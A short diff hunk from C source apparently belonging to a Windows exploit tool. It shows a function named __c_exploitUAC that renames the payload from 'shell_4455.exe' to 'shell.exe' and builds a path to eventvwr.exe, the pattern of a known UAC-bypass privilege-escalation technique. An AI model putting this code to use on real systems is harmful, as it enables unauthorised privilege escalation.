@@ -71,7 +71,7 @@ void __c_exploitUAC() {
 
 	//Change this
 	GetCurrentDirectory(MAX_PATH, curPath);
-	strcat(curPath, "\\shell_4455.exe");
+	strcat(curPath, "\\shell.exe");
 
 	sprintf(evtVwr, "%s\\System32\\eventvwr.exe", getenv("SYSTEMROOT"));
 
